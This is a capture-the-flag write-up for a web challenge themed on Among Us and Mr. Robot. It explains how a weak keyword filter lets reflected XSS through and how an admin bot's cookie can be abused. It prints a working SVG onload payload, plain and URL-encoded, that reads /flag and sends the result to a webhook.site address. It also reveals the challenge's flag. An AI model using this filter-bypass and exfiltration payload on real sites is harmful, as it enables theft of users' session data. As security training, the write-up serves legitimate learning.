
# ??? Impostor in the DOM

> *"Hello friend... hello friend? That's lame."*

A suspicious terminal on **Polus** is accepting anonymous crew logs.  
Mission control suspects **malicious payloads** are being transmitted.

Can you uncover the **impostor hiding in the DOM?**

---

## ?? Challenge Information

| Field | Value |
|------|------|
| **Category** | Web Exploitation |
| **Difficulty** | Easy |
| **Flag Format** | `DAKSHH{...}` |
| **Flag** | `DAKSHH{sus_in_the_dom}` |

---

# ?? Vulnerability Analysis

The application allows users to submit feedback through the `/feedback` endpoint.

Example request:

```
/feedback?msg=hello
```

Inside the response page, the application **reflects the user input directly into HTML**.

```javascript
${msg}
```

However, the developer attempted to prevent XSS using a **very weak keyword filter**:

```javascript
const blockedKeywords = ['script', 'alert', 'onerror'];
```

If any of these keywords appear in the input, the message is blocked.

While this prevents some simple payloads like:

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

it **does not prevent other HTML elements capable of executing JavaScript**.

---

# ?? Admin Bot Behavior

The challenge includes an **admin bot** that visits URLs submitted through the **Report URL** feature.

Endpoint:

```
POST /report
```

The bot then visits the submitted URL.

Before visiting, the bot sets an **admin cookie**:

```javascript
await page.setCookie({
    name: 'admin',
    value: 'true',
    domain: 'app'
});
```

This cookie allows access to a protected endpoint:

```
/flag
```

---

# ?? Flag Endpoint

The flag is protected by a cookie check:

```javascript
app.get('/flag', (req, res) => {
    if (req.headers.cookie && req.headers.cookie.includes('admin=true')) {
        res.send("DAKSHH{sus_in_the_dom}");
    } else {
        res.status(403).send("Access Denied");
    }
});
```

Only the **admin bot** can access this endpoint.

---

# ?? Exploit Strategy

The attack flow is:

1. Inject an **XSS payload** through the `msg` parameter.
2. Submit the malicious URL to the **admin bot** using `/report`.
3. When the bot visits the page, the payload executes.
4. The JavaScript fetches `/flag`.
5. The flag is exfiltrated to an attacker-controlled webhook.

---

# ?? XSS Payload

Since `script`, `alert`, and `onerror` are blocked, we can use an **SVG onload handler**.

```html
<svg/onload="fetch('/flag').then(r=>r.text()).then(t=>fetch('https://webhook.site/YOUR_ID?flag='+t))">
```

This payload:

1. Requests `/flag`
2. Reads the response
3. Sends it to a webhook

---

# ?? URL Encoded Payload

```
%3Csvg%2Fonload%3D%22fetch%28%27%2Fflag%27%29.then%28r%3D%3Er.text%28%29%29.then%28t%3D%3Efetch%28%27https%3A%2F%2Fwebhook.site%2FYOUR_ID%3Fflag%3D%27%2Bt%29%29%22%3E
```

---

# ?? Exploiting the Admin Bot

Construct the malicious URL:

```
http://app:3000/feedback?msg=PAYLOAD
```

Example:

```
http://app:3000/feedback?msg=%3Csvg%2Fonload%3D%22fetch%28%27%2Fflag%27%29.then%28r%3D%3Er.text%28%29%29.then%28t%3D%3Efetch%28%27https%3A%2F%2Fwebhook.site%2FYOUR_ID%3Fflag%3D%27%2Bt%29%29%22%3E
```

Submit this URL to the **Report URL** form.

The server forwards the request to the **admin bot**, which loads the page and executes the payload.

---

# ?? Receiving the Flag

When the payload executes, the bot sends the flag to the webhook:

```
flag=DAKSHH{sus_in_the_dom}
```

---

# ?? Final Flag

```
DAKSHH{sus_in_the_dom}
```

---

# ?? Easter Eggs

Hidden references in the challenge:

### Mr. Robot

```
"Hello friend... hello friend? That's lame."
```

A quote from **Elliot Alderson**.

---

### Among Us

```html
<!-- sanitize later... seems kinda sus -->
```

A reference to the famous **"sus"** meme.

---

# ?? Skills Tested

- Cross-Site Scripting (XSS)
- Filter bypass
- Admin bot exploitation
- Cookie-based authentication
- Data exfiltration
